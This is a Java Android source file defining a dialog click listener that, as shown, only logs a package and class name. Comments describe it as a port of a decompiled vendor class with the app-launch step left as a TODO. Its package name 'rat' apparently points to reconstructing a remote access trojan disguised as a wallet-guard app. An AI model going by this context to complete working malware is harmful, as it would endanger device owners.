package com.vendor.rat.helper;

import android.content.DialogInterface;
import android.util.Log;

/**
 * Vendor: com.guard.wallet.helper.l
 * OnClickListener for notification dialog positive button.
 * Triggers app launch via package/class name.
 */
public final class NotifyClickListener implements DialogInterface.OnClickListener {

    public final String packageName;
    public final String className;

    public NotifyClickListener(String packageName, String className) {
        this.packageName = packageName;
        this.className = className;
    }

    @Override
    public final void onClick(DialogInterface dialogInterface, int which) {
        // ADAPT: vendor calls utils.g.Y0(packageName, className) to launch activity
        // TODO: VENDOR_VERIFY - activity launch implementation
        Log.d("NotifyClickListener", "onClick: launch " + packageName + "/" + className);
    }
}
